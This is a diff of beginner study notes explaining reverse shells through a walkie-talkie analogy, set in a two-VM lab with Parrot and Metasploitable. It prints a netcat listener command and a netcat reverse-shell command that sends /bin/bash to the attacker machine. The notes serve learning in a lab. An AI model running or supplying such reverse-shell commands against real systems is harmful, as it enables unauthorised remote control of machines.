@@ -1,3 +1,13 @@
+#simple explanation
+imagine you have two toy walkie-talkies. Let's say one walkie-talkie is on the computer you want to control (the target), and the other is on your computer (the attacker).
+
+Reverse Shell: The Target Calls You
+Think of it like this:
+The target walkie-talkie calls your walkie-talkie.
+You just need to have your walkie-talkie turned on and ready to receive the call.
+Once you answer, you can talk through your walkie-talkie, and your friend on the other walkie-talkie (the target computer) will hear you and can talk back, letting you control it.
+
+#step 1
 command from VM 1(parrot) nc -nlvp 443 
 
 break down each part:
@@ -9,7 +19,7 @@ nc: This is the command itself, short for Netcat.
 
 in summary it creates a simple, unencrypted TCP listener on port 443 of your Linux machine, providing verbose output and skipping DNS resolution. It's useful for basic connection testing and manual data exchange but lacks the security features expected on port 443 for standard web traffic.
 
-
+#step 2
 command from VM 2(metasploitable) nc 192.168.229.100 443 -e /bin/bash is a potentially dangerous command used to establish a reverse shell to the IP address 192.168.229.100 on port 443. 
 
 break down each part:
